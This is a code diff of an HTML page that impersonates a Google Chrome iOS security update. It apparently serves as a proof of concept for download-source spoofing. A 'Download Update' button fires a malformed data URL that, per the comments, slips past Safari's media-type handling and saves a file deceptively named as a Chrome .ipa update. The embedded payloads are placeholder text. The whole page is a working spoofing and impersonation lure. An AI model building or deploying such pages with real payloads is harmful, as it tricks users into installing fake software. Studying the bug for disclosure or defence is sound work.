@@ -1,36 +1,37 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>chrome.com – Security Update</title>
+  <meta charset="UTF-8">
+  <title>chrome.com – iOS Security Update</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
 <body style="font-family:-apple-system;text-align:center;margin-top:60px">
 
-<h2>Chrome Security Update</h2>
-<p>Source: chrome.com</p>
+  <h2>Google Chrome iOS Security Update</h2>
+  <p><b>Source:</b> chrome.com</p>
 
-<button style="font-size:20px" onclick="go()">
-  Download Update
-</button>
+  <button style="font-size:20px;padding:12px 22px" onclick="go()">
+    Download Update
+  </button>
 
 <script>
 function go() {
   /*
-    MALFORMED data URL:
-    - Media type is INVALID (chrome.com/application)
-    - Forces fallback
-  */
-  const payload =
-    "data:chrome.com/application/x-msdownload;base64," +
-    "RkFLRSBDSFJPTUUgVVBEQVRF";
+   * MALFORMED data URL:
+   * - Media type INVALID: chrome.com/application
+   * - Safari fallback → octet-stream
+   * - Still allowed to Save to Files
+   */
+  const data =
+    "data:chrome.com/application/octet-stream;base64," +
+    "UEsDBAoAAAAAAFAKEElQQSBQQUNLQUdF";
 
   const a = document.createElement("a");
-  a.href = payload;
+  a.href = data;
 
-  // Filename deception
-  a.download = "Chrome_Update_136.0.7103.127.apk";
+  // Filename trust deception
+  a.download = "Chrome_iOS_Update_136.0.7103.127.ipa";
 
   document.body.appendChild(a);
   a.click();
